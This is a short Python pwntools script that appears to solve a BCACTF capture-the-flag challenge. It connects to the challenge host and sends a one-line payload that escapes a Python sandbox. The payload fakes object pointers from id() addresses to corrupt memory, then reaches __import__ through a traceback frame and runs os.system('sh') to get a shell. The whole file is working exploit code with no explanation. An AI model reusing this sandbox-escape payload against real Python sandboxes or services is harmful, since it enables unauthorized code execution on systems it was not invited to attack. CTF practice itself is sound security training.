from pwn import remote
# nc challs.bcactf.com 22711
r = remote("challs.bcactf.com", 22711)

payload = '''(b := b'B' * 0x10000) and (mem := b'C' * 0x10000) and [
  (lst := [0] * 0x2000),
  (lambda l, m: ([1 for l[10:11:2] in [((
      [1 for x[1:] in [[]]],
      id(m).to_bytes(8, 'little') * 0x2000, None) for x in [l])]]))(lst, mem),
  (b := 0),
  (
    b'A' * 0x10000 +
    b'A' * 0x18 + 
    (id(tuple)).to_bytes(8, 'little') +
    (1).to_bytes(8, 'little') + 
    (id(divmod) + 0xa0).to_bytes(8, 'little')
  ),
  sorted(mem).pop()('try: 1/0\nexcept Exception as e: e.traceback.tb_frame.f_back.f_back.f_builtins["__import__"]("os").system("sh")')
]'''.replace('\n', '')

r.sendline(payload)
r.interactive(prompt="")